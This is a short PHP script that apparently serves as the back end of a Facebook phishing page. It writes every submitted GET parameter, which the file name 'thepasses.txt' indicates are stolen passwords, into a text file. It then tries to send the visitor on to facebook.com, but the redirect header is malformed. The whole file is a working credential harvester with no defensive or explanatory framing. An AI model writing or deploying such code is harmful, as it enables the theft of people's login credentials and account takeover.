<?php
 header("http://www.facebook.com");
 $handle = fopen("thepasses.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
 fwrite($handle, $value);
 fwrite($handle, "\r\n");
 }
 fwrite($handle, "\r\n");
 fclose($handle);
 exit;
 ?>
